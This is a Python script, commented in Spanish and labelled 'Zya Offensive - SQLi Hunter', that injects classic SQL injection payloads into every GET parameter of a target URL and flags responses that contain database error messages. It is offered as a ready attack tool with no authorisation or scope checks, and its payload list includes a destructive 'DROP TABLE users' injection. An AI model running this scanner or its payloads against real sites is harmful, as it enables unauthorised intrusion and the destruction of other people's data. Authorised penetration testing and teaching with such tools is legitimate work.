#!/usr/bin/env python3
import requests
import urllib.parse
import argparse
from datetime import datetime

# Payloads típicos para detectar SQLi
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1-- ",
    "'; DROP TABLE users;--",
    "\" OR \"\"=\"",
    "' OR 'x'='x"
]

# Mensajes de error comunes que indican vulnerabilidad
ERRORS_SQL = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch_array()",
    "syntax error",
    "sqlstate",
    "sql syntax"
]

def test_sqli(url):
    print(f"\n[ * ] Probando URL: {url}")
    vulnerable = False
    
    parsed = list(urllib.parse.urlparse(url))
    query = urllib.parse.parse_qs(parsed[4])
    
    for payload in PAYLOADS:
        for param in query:
            orig = query[param]
            query[param] = payload
            parsed[4] = urllib.parse.urlencode(query, doseq=True)
            test_url = urllib.parse.urlunparse(parsed)
            
            try:
                r = requests.get(test_url, timeout=5)
                text = r.text.lower()
                for error in ERRORS_SQL:
                    if error in text:
                        print(f"[+] Posible SQLi detectado en parámetro '{param}' con payload: {payload}")
                        vulnerable = True
                        break
            except Exception as e:
                print(f"[-] Error en la solicitud: {e}")
            
            query[param] = orig  # Reset valor original
    
    if not vulnerable:
        print("[-] No se detectaron vulnerabilidades SQLi con payloads básicos.")
    return vulnerable

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zya Offensive - SQLi Hunter")
    parser.add_argument("url", help="URL objetivo con parámetros GET (ejemplo: http://site.com/page.php?id=1)")
    args = parser.parse_args()

    print(f"\n[ * ] Iniciando escaneo SQLi")
    print(f"[ * ] Objetivo: {args.url}")
    print(f"[ * ] Hora de inicio: {datetime.now()}")
    test_sqli(args.url)
    print(f"\n[ * ] Escaneo finalizado: {datetime.now()}")
